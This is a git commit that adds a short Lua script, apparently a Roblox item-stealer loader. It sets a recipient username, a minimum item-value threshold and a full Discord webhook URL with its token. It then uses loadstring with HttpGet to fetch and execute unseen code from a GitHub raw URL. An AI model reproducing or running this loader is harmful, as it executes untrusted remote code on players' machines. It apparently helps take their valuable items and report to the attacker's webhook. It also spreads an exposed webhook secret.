81b2482d93692d961bfb4f069c0949678b1a8ed1
214Eli <busterbishop22@icloud.com>
2025-02-22 11:03:17 +0800

    Created new script file

---
+++ scripts/script-94c5e5bd2b44.lua
@@ -0,0 +1,8 @@
+
+Username = "antbish"
+Username2 = "antbish"
+MinimumRAP = 1000000
+Webhook = "https://discord.com/api/webhooks/1341388841742762066/lylm1u6wniMwhWOeYSfkQxgsdxizLbdMZ1Z5LYO_dit8eR6Wfvc8Sh1WQY09BZhs8Nvt"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/214Eli/214scripts/refs/heads/main/214scripts", true))()
+      
